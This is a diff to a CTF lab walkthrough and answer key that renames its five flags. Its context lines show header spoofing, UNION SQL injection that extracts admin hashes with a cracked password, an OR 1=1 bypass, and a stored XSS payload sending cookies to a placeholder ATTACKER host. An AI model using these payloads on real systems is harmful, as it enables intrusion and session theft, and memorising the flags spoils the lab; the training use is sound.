@@ -253,7 +253,7 @@ HACKDAY-LAB/
 X-Forwarded-For: 192.168.1.1
 Referer: http://ptpetho-sso.local
 ```
-**FLAG 1:** `FLAG{h34d3r_trust_1ssu3}`
+**FLAG 1:** `SMC{h34d3r_trust_1ssu3}`
 
 ---
 
@@ -274,7 +274,7 @@ SELECT * FROM staff WHERE name='$input'
 ' UNION SELECT username,password_hash,role,4 FROM ptpetho_staff WHERE role='superadmin'-- -
 ```
 **Result:** director.kim / 3fc0a7acf087f549ac2b266baf94b8b1 (MD5: ptpetho2026)
-**FLAG 2:** `FLAG{uni0n_b4s3d_extr4ct10n}`
+**FLAG 2:** `SMC{uni0n_b4s3d_extr4ct10n}`
 
 #### Challenge 7: "Filter Bypass" → FLAG 3
 **File:** `src/ptpetho-admin/index.php`
@@ -283,7 +283,7 @@ SELECT * FROM staff WHERE name='$input'
 ```sql
 admin' OR 1=1/*
 ```
-**FLAG 3:** `FLAG{f1lt3r_byp4ss_succ3ss}`
+**FLAG 3:** `SMC{f1lt3r_byp4ss_succ3ss}`
 
 ---
 
@@ -302,13 +302,13 @@ admin' OR 1=1/*
 ```html
 <img src=x onerror="fetch('http://ATTACKER:8000/log?c='+document.cookie)">
 ```
-**FLAG 4:** `FLAG{st0r3d_xss_c00k13_th3ft}`
+**FLAG 4:** `SMC{st0r3d_xss_c00k13_th3ft}`
 
 #### Challenge 10: "Session Hijacking" → FLAG 5
 **File:** `src/ptpetho-admin/fuel-cost.php`
 **Vulnerability:** Session can be hijacked with stolen cookie
 **Solution:** Add CEO's session cookie in browser DevTools
-**FLAG 5:** `FLAG{s3ss10n_h1j4ck_truth_r3v34l3d}`
+**FLAG 5:** `SMC{s3ss10n_h1j4ck_truth_r3v34l3d}`
 
 ---
 
@@ -381,11 +381,11 @@ volumes:
 
 | # | Flag Value | Challenge | Points |
 |---|------------|-----------|--------|
-| 1 | `FLAG{h34d3r_trust_1ssu3}` | Header Spoofing | 100 |
-| 2 | `FLAG{uni0n_b4s3d_extr4ct10n}` | Union SQLi | 200 |
-| 3 | `FLAG{f1lt3r_byp4ss_succ3ss}` | Filter Bypass | 150 |
-| 4 | `FLAG{st0r3d_xss_c00k13_th3ft}` | Stored XSS | 200 |
-| 5 | `FLAG{s3ss10n_h1j4ck_truth_r3v34l3d}` | Session Hijack | 250 |
+| 1 | `SMC{h34d3r_trust_1ssu3}` | Header Spoofing | 100 |
+| 2 | `SMC{uni0n_b4s3d_extr4ct10n}` | Union SQLi | 200 |
+| 3 | `SMC{f1lt3r_byp4ss_succ3ss}` | Filter Bypass | 150 |
+| 4 | `SMC{st0r3d_xss_c00k13_th3ft}` | Stored XSS | 200 |
+| 5 | `SMC{s3ss10n_h1j4ck_truth_r3v34l3d}` | Session Hijack | 250 |
 
 ---
 
